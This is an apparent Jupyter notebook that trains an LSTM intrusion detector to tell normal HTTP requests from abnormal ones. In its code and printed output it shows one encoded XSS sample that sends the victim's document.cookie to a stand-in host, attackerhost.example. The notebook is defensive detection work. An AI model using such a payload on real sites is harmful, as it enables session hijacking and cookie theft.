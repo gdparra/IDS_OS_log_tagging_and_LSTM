{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Normal Sample: \n",
      "\n",
      " Method: 0\n",
      " Content_length:0 \n",
      " URL: http://localhost:8080/tienda1/miembros/editar.jsp \n",
      " Payload: direccion=Calle+Barrio+Cura-vigo+Vello%2C+134+10%3FD \n",
      "\n",
      "[  0.00000000e+00   0.00000000e+00   6.42310682e-03   4.09115084e-05\n",
      "   8.18230168e-05   1.63646034e-04   2.86380559e-04   3.68203576e-04\n",
      "   2.04557542e-04   0.00000000e+00   0.00000000e+00   0.00000000e+00\n",
      "   0.00000000e+00   0.00000000e+00   0.00000000e+00   9.23045453e-01\n",
      "   3.02745162e-03   2.69197725e-02   5.15894121e-01   2.49682936e-01\n",
      "   6.38383177e-01   2.64697459e-02   5.52305363e-03   5.11393855e-03\n",
      "   0.00000000e+00   0.00000000e+00   0.00000000e+00   0.00000000e+00\n",
      "   0.00000000e+00   0.00000000e+00   0.00000000e+00   0.00000000e+00\n",
      "   0.00000000e+00   0.00000000e+00]\n",
      "\n",
      "\n",
      "[ 0.  1.]\n",
      "\n",
      "\n",
      "Abormal Sample:\n",
      "\n",
      "\n",
      " Method: 0\n",
      " Content_length:0 \n",
      " URL: http://localhost:8080/tienda1/publico/caracteristicas.jsp \n",
      "\n",
      " Payload: id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F \n",
      "\n",
      " Payload Decoded: id 1sessionid 12312312 username script document location http attackerhost example cgi bin cookiesteal cgi document cookie s cript 0 0\n",
      "\n",
      "\n",
      "[  0.00000000e+00   0.00000000e+00   6.42310682e-03   4.09115084e-05\n",
      "   8.18230168e-05   1.63646034e-04   2.45469050e-04   1.02278771e-03\n",
      "   2.04557542e-04   0.00000000e+00   0.00000000e+00   0.00000000e+00\n",
      "   0.00000000e+00   0.00000000e+00   0.00000000e+00   8.83688582e-03\n",
      "   3.36701714e-02   6.46401833e-03   6.70948738e-03   5.76852269e-03\n",
      "   4.70482347e-03   6.66857587e-03   6.42310682e-03   8.91870883e-03\n",
      "   6.62766436e-03   4.66391196e-03   6.54584135e-03   6.58675285e-03\n",
      "   4.66391196e-03   4.70482347e-03   3.92750481e-03   4.41844291e-03\n",
      "   1.07188152e-02   0.00000000e+00]\n",
      "\n",
      "\n",
      "[ 1.  0.]\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'\\nprint(\"Input Test Data:\")\\nprint(type(xt_in))\\nprint(len(xt_in))\\nprint(type(xt_in[0]))\\nprint(len(xt_in[0]))\\n\\nprint(\"Input Test Data:\")\\nprint(type(test_xin_np))\\nprint(len(test_xin_np))\\nprint(type(test_xin_np[0]))\\nprint(len(test_xin_np[0]))\\nprint(test_xin_np[0])\\n'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import tensorflow as tf\n",
    "#from tensorflow.examples.tutorials.mnist import input_data\n",
    "from tensorflow.python.ops import rnn, rnn_cell\n",
    "#mnist = input_data.read_data_sets('MNIST_data', one_hot=True) # Removed\n",
    "import numpy as np # Included\n",
    "\n",
    "fx_array=open('Parsed Data/complete_train_rand_xin.npy','rb')\n",
    "x_in = np.load(fx_array)\n",
    "\n",
    "fy_array=open('Parsed Data/complete_train_rand_yin.npy','rb')\n",
    "y_in = np.load(fy_array)\n",
    "\n",
    "fxt_array=open('Parsed Data/complete_test_rand_xin.npy','rb')\n",
    "xt_in = np.load(fxt_array)\n",
    "\n",
    "fyt_array=open('Parsed Data/complete_test_rand_yin.npy','rb')\n",
    "yt_in = np.load(fyt_array)\n",
    "\n",
    "print(\"Normal Sample: \\n\")\n",
    "print(\" Method: 0\\n \\\n",
    "Content_length:0 \\n \\\n",
    "URL: http://localhost:8080/tienda1/miembros/editar.jsp \\n \\\n",
    "Payload: direccion=Calle+Barrio+Cura-vigo+Vello%2C+134+10%3FD \\n\")\n",
    "\n",
    "print(xt_in[84])\n",
    "print(\"\\n\")\n",
    "print(yt_in[84])\n",
    "print(\"\\n\")\n",
    "\n",
    "print(\"Abormal Sample:\")\n",
    "print(\"\\n\")\n",
    "print(\" Method: 0\\n \\\n",
    "Content_length:0 \\n \\\n",
    "URL: http://localhost:8080/tienda1/publico/caracteristicas.jsp \\n\\n \\\n",
    "Payload: id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F \\n\\n \\\n",
    "Payload Decoded: id 1sessionid 12312312 username script document location http attackerhost example cgi bin cookiesteal cgi document cookie s cript 0 0\")\n",
    "print(\"\\n\")\n",
    "print(xt_in[337])\n",
    "print(\"\\n\")\n",
    "print(yt_in[337])\n",
    "\n",
    "test_xin_np = np.array([xt_in[84],xt_in[337]])\n",
    "test_yin_np = np.array([yt_in[84],yt_in[337]])\n",
    "'''\n",
    "print(\"Input Test Data:\")\n",
    "print(type(xt_in))\n",
    "print(len(xt_in))\n",
    "print(type(xt_in[0]))\n",
    "print(len(xt_in[0]))\n",
    "\n",
    "print(\"Input Test Data:\")\n",
    "print(type(test_xin_np))\n",
    "print(len(test_xin_np))\n",
    "print(type(test_xin_np[0]))\n",
    "print(len(test_xin_np[0]))\n",
    "print(test_xin_np[0])\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "hm_epochs = 10\n",
    "n_classes = 2\n",
    "batch_size = 128\n",
    "chunk_size = 1 # Changed\n",
    "n_chunks = 34 # Changes\n",
    "rnn_size = 34\n",
    "\n",
    "x = tf.placeholder(\"float\", shape=[None, n_chunks, chunk_size])\n",
    "y = tf.placeholder(\"float\")\n",
    "x_t = tf.placeholder(\"float\", shape=[None, n_chunks, chunk_size])\n",
    "y_t = tf.placeholder(\"float\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "x_request=\n",
      "Tensor(\"Reshape:0\", shape=(?, 28, 1, 1), dtype=float32)\n"
     ]
    }
   ],
   "source": [
    "x_request = tf.reshape(x, [-1,28,1,1])\n",
    "print (\"x_request=\")\n",
    "print (x_request)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:<tensorflow.python.ops.rnn_cell.BasicLSTMCell object at 0x7f40e039b5f8>: Using a concatenated state is slower and will soon be deprecated.  Use state_is_tuple=True.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 0 completed out of 10 loss: 211.983140483\n",
      "Epoch 1 completed out of 10 loss: 188.236403942\n",
      "Epoch 2 completed out of 10 loss: 177.203589275\n",
      "Epoch 3 completed out of 10 loss: 174.605009757\n",
      "Epoch 4 completed out of 10 loss: 168.428512752\n",
      "Epoch 5 completed out of 10 loss: 160.02251558\n",
      "Epoch 6 completed out of 10 loss: 156.056365021\n",
      "Epoch 7 completed out of 10 loss: 155.833677314\n",
      "Epoch 8 completed out of 10 loss: 156.730916351\n",
      "Epoch 9 completed out of 10 loss: 152.429500625\n",
      "Accuracy: 0.933411\n"
     ]
    }
   ],
   "source": [
    "class DataSet(object):\n",
    "    def __init__(self, requests, labels):\n",
    "        assert requests.shape[0] == labels.shape[0], (\"requests.shape: %s labels.shape: %s\" % (requests.shape,\n",
    "                                                 labels.shape))\n",
    "        self._num_examples = requests.shape[0]\n",
    "        # Convert shape from [num examples, rows, columns, depth]\n",
    "        # to [num examples, rows*columns] (assuming depth == 1)\n",
    "        requests = requests.reshape(requests.shape[0],\n",
    "                              requests.shape[1])\n",
    "        self._requests = requests\n",
    "        self._labels = labels\n",
    "        self._epochs_completed = 0\n",
    "        self._index_in_epoch = 0\n",
    "        \n",
    "    def next_batch(self, batch_size):\n",
    "        \"\"\"Return the next `batch_size` examples from this data set.\"\"\"\n",
    "        start = self._index_in_epoch\n",
    "        self._index_in_epoch += batch_size\n",
    "        if self._index_in_epoch > self._num_examples:\n",
    "            # Finished epoch\n",
    "            self._epochs_completed += 1\n",
    "            # Shuffle the data\n",
    "            #print(\"=== Current Perm ===\")\n",
    "            #print(\"=== index_in_epoch === : %s\" % self._index_in_epoch)\n",
    "            perm = np.arange(self._num_examples)\n",
    "            #print(perm)\n",
    "            np.random.shuffle(perm)\n",
    "            self._requests = self._requests[perm]\n",
    "            self._labels = self._labels[perm]\n",
    "            # Start next epoch\n",
    "            start = 0\n",
    "            self._index_in_epoch = batch_size\n",
    "            assert batch_size <= self._num_examples\n",
    "        end = self._index_in_epoch\n",
    "        return self._requests[start:end], self._labels[start:end]\n",
    "\n",
    "current_data = DataSet(x_in, y_in)\n",
    "def recurrent_neural_network(x):\n",
    "    layer = {'weights':tf.Variable(tf.random_normal([rnn_size, n_classes])),\n",
    "             'biases':tf.Variable(tf.random_normal([n_classes]))}\n",
    "    \n",
    "    x = tf.transpose(x, [1,0,2])\n",
    "    x = tf.reshape(x, [-1, chunk_size])\n",
    "    x = tf.split(0, n_chunks, x)\n",
    "    def make_cell():\n",
    "        \n",
    "        lstm_cell = rnn_cell.BasicLSTMCell(rnn_size)\n",
    "        return lstm_cell\n",
    "    \n",
    "    lstm_cell = tf.contrib.rnn.MultiRNNCell(\n",
    "    [make_cell for _ in range(2)], state_is_tuple=True)\n",
    "    \n",
    "    \n",
    "    #Helper\n",
    "    #Decoder\n",
    "    # +  = dynamic\n",
    "    output, states = rnn.rnn(lstm_cell, x, dtype=tf.float32)\n",
    "\n",
    "    output = tf.matmul(output[-1],layer['weights']) + layer['biases']\n",
    "\n",
    "    return output\n",
    "\n",
    "def train_neural_network(x):\n",
    "    prediction = recurrent_neural_network(x)\n",
    "    cost = tf.reduce_mean( tf.nn.softmax_cross_entropy_with_logits(prediction,y) )\n",
    "    optimizer = tf.train.AdamOptimizer().minimize(cost)\n",
    "    \n",
    "    with tf.Session() as sess:\n",
    "        sess.run(tf.initialize_all_variables())\n",
    "\n",
    "        for epoch in range(hm_epochs):\n",
    "            epoch_loss = 0\n",
    "            for _ in range(int(current_data._num_examples/batch_size)):\n",
    "                epoch_x, epoch_y = current_data.next_batch(batch_size)\n",
    "                epoch_x = epoch_x.reshape((batch_size, n_chunks, chunk_size))\n",
    "                _, c = sess.run([optimizer, cost], feed_dict={x: epoch_x, y: epoch_y})\n",
    "                epoch_loss += c\n",
    "\n",
    "            print('Epoch', epoch, 'completed out of',hm_epochs,'loss:',epoch_loss)\n",
    "\n",
    "        correct = tf.equal(tf.argmax(prediction, 1), tf.argmax(y, 1))\n",
    "\n",
    "        accuracy = tf.reduce_mean(tf.cast(correct, 'float'))\n",
    "        print('Accuracy:',accuracy.eval({x:xt_in.reshape((-1, n_chunks, chunk_size)), y:yt_in}))\n",
    "        #print('Test Abnormal:',accuracy.eval({x_t:test_xin_np.reshape((-1, n_chunks, chunk_size)), y_t:test_yin_np}))\n",
    "\n",
    "train_neural_network(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
